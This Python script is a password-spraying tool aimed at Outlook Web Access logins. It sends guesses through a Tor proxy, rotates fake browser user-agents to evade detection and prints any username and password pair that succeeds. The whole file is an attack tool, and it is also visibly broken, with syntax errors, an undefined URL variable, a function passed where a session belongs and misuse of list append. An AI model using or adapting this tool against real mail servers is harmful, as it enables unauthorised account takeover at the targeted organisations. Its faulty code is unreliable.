import requests
import random


def get_tor_session(ip="127.0.0.1", port="9150"):
    session = requests.session()
    session.proxies = {'http': "socks5://{}:{}".format(ip, port),
                       'https': "socks5://{}:{}".format(ip,port)
                    }
    return session

def get_headers():
    user_agent_list = [
        # Chrome
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
        'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
        # Firefox
        'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
        'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)',
        'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
        'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)'
    ]
    return {'User-Agent': random.choice(user_agent_list)}

def get_passwords(passwords_file):
    passwords = []
    with open(passwords_file) as f:
        for line in f:
            passwords.append(line.rstrip())
    passwords.sort()
    return passwords

def spray(browser_session, url, username, passwords, tor=True message="Try entering it again"):
    headers = get_headers()
    browser_session.get(url, headers=get_headers())
    for password in passwords:
        login_data = {
            "destination": url,
            "flags": 4,
            "forcedownlevel": 0,
            "username": username,
            "password": password,
            "passwordText":"",
            "isUtf8": 1
        }
        response = browser_session.post("{}/auth.owa".format(url), data=login_data, headers=headers)
        if message not in response.content:
            return password
    return None


if __name__ == '__main__':
    tor = True
    usernames_file = 'usernames.txt'
    passwords_file = 'passwords.txt'

    usernames = []
    with open(usernames_file) as f:
        for line in f:
            usernames.append(line.rstrip())
    
    passwords = get_passwords(passwords_file)

    for username in usernames:
        browser_session = get_tor_session() if tor else: requests.session() 
        password = spray(get_tor_session, url, username, passwords[:].append(username))
        if password:
            print "[+] {}:{}".format(username, password)
